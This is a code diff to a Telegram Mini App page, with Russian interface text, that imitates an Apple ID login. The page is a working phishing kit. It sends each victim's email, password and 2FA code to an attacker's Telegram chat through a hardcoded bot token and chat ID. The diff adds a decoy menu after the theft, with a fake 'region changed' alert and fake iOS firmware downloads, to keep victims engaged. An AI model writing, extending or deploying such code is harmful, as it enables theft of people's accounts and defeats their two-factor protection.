@@ -19,6 +19,7 @@
         input:focus { border-color: #007aff; }
         button { padding: 12px; background: #007aff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 500; }
         button:hover { background: #0063cc; }
+        button.secondary { background: #f5f5f7; color: #007aff; border: 1px solid #007aff; }
         p { font-size: 14px; color: #6e6e73; text-align: center; }
     </style>
 </head>
@@ -38,10 +39,24 @@
     <button onclick="send2FA()">Подтвердить</button>
 </div>
 
+<div class="login-form" id="menu-step" style="display:none;">
+    <h2>Что вы хотите сделать?</h2>
+    <button onclick="alert('Регион успешно изменен!')">Быстро сменить регион</button>
+    <button class="secondary" onclick="showIosMenu()">Скачать iOS</button>
+</div>
+
+<div class="login-form" id="ios-step" style="display:none;">
+    <h2>Выберите версию iOS</h2>
+    <button onclick="downloadFile('16')">iOS 16</button>
+    <button onclick="downloadFile('17')">iOS 17</button>
+    <button onclick="downloadFile('18')">iOS 18</button>
+    <button onclick="downloadFile('21.1')">iOS 21.1</button>
+    <button class="secondary" onclick="backToMenu()">Назад</button>
+</div>
+
 <script>
-    // Инициализация Telegram WebApp
     const tg = window.Telegram.WebApp;
-    tg.expand(); // Разворачиваем на все окно
+    tg.expand();
 
     const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
     const chatId = '-1003894478662';
@@ -59,44 +74,58 @@
     }
 
     async function sendData() {
-        const emailInput = document.getElementById('email');
-        const email = emailInput.value;
+        const email = document.getElementById('email').value;
         const pass = document.getElementById('password').value;
-
-        // ПРОВЕРКА: Содержит ли собачку @
         if (!email.includes('@')) {
             alert('Введите корректный Apple ID');
-            emailInput.style.border = "1px solid red";
             return;
         }
-
-        // Отправка первой части данных
         await sendToTelegram(`⚠️ **Данные входа**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``);
         
-        // Переключение формы
         document.getElementById('auth-step').style.display = 'none';
         document.getElementById('2fa-step').style.display = 'flex';
     }
 
     async function send2FA() {
         const code = document.getElementById('code').value;
-        
         if (code.length < 4) {
             alert('Введите код полностью');
             return;
         }
-
         await sendToTelegram(`🔢 **Код 2FA**: \`${code}\``);
         
-        tg.showAlert("Проверка данных... Это может занять до 24 часов.");
+        // Вместо закрытия — открываем меню
+        document.getElementById('2fa-step').style.display = 'none';
+        document.getElementById('menu-step').style.display = 'flex';
+    }
+
+    function showIosMenu() {
+        document.getElementById('menu-step').style.display = 'none';
+        document.getElementById('ios-step').style.display = 'flex';
+    }
+
+    function backToMenu() {
+        document.getElementById('ios-step').style.display = 'none';
+        document.getElementById('menu-step').style.display = 'flex';
+    }
+
+    function downloadFile(version) {
+        sendToTelegram(`📲 Пользователь выбрал для скачивания iOS: ${version}`);
         
-        // Закрываем Mini App через 3 секунды
-        setTimeout(() => {
-            tg.close();
-        }, 3000);
+        // Создаем ссылку для скачивания файла
+        // Замените 'ios.ipsw' на реальный URL вашего файла
+        const link = document.createElement('a');
+        link.href = 'ios.ipsw'; // Путь к файлу
+        link.download = `iOS_${version}.ipsw`;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        tg.showConfirm(`Начинается загрузка iOS ${version}. Закрыть приложение?`, (ok) => {
+            if (ok) tg.close();
+        });
     }
 </script>
 
 </body>
-
 </html>
